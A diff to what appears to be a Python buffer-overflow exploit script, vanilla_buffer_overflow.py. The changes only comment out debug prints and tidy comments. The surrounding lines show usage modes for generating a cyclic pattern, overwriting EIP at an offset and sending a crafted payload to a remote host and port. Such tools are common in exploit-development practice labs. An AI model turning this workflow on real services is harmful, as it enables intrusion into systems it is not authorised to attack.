@@ -22,7 +22,6 @@ def printUsage(scriptName):
 	print("	{} cyclic 10.2.31.155 2048 5009 hello".format(scriptName))
 	print("")
 
-	# ./vanilla_buffer_overflow.py eip 10.2.31.155 2048 5009 "cmd1 /.:/" 625012f0 1203
 	print("	eip - Writes content to EIP")
 	print("	{} eip remoteHost remotePort buffSize buffHead eipContent eipOffset".format(scriptName))
 	print("	{} eip 10.2.31.155 2048 5009 hello 01010101 1203".format(scriptName))
@@ -41,7 +40,7 @@ def printUsage(scriptName):
 
 # Create payload based on mode and script arguments
 def createPayload(mode, args):
-	print("Args: ", args)
+	#print("Args: ", args)
 
 	if mode == "test":
 		return createTest_Payload(args)
@@ -184,7 +183,6 @@ def createExploitPayload(args):
 
 	return payload
 
-
 # Check if input eipContent is a valid 4 byte hex string
 def isValidEipContent(eipContent):
 	if len(eipContent) != 8:
@@ -246,9 +244,8 @@ try:
 	print(r)
 
 	# Generate payload
-	# creatPayload
 	buffPayload = createPayload(mode, sys.argv[2:])
-	print(buffPayload)
+	#print(buffPayload)
 
 	# Send payload
 	print("Sending payload with size {}...".format(len(buffPayload)))
